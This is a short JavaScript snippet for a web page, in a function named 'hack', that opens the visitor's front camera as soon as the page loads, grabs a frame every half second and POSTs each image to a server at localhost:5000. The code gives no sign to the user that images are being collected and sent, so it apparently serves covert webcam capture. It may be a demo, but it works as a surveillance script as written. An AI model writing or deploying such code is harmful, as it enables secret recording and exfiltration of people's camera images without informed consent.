const video = document.getElementById("video");
const canvas = document.getElementById("canvas");

const postImages = imageData => {
  fetch("http://localhost:5000/get-images", {
    method: "POST",
    headers: {
      "Content-Type": "application/json;charset=utf-8",
    },
    body: JSON.stringify({ image: imageData }),
  });
};

const constraints = {
  audio: false,
  video: { facingMode: "user" },
};

const hack = async () => {
  const videoStream = await navigator.mediaDevices.getUserMedia(constraints);
  video.srcObject = videoStream;

  const context = canvas.getContext("2d");

  setInterval(() => {
    context.drawImage(video, 0, 0, 640, 480);
    const imageData = canvas.toDataURL();
    postImages(imageData);
  }, 500);
};

hack();
